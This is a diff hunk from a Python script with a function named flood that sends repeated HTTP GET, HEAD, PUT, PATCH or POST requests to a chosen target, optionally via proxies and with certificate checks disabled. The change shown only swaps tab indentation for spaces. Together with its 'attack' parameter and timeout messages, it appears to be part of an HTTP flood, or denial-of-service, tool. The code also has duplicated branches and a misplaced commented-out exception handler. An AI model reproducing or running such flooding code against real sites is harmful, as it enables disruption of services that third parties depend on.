@@ -32,32 +32,32 @@ def flood(target,domainname,attack,sock):
         proxies =''
 		
     try:
-		if proxies!='':
-			if attack =='get':
-				r = s.get(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-			elif attack =='head':
-				r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-			elif attack =='put':
-				r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-			elif attack =='patch':
-				r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-			elif attack =='patch':
-				r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-			else:
-				r = s.post(target,params=payload ,headers=headers, timeout=20 , verify=False,proxies=proxies)
-		else:
-			if attack =='get':
-				r = s.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
-			elif attack =='head':
-				r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
-			elif attack =='put':
-				r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
-			elif attack =='patch':
-				r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
-			elif attack =='patch':
-				r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
-			else:
-				r = s.post(target,params=payload ,headers=headers, timeout=20 , verify=False)
+        if proxies!='':
+            if attack =='get':
+                r = s.get(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
+            elif attack =='head':
+                r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
+            elif attack =='put':
+                r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
+            elif attack =='patch':
+                r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
+            elif attack =='patch':
+                r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
+            else:
+                r = s.post(target,params=payload ,headers=headers, timeout=20 , verify=False,proxies=proxies)
+        else:
+            if attack =='get':
+                r = s.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='head':
+                r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='put':
+                r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='patch':
+                r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='patch':
+                r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            else:
+                r = s.post(target,params=payload ,headers=headers, timeout=20 , verify=False)
 
     #except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
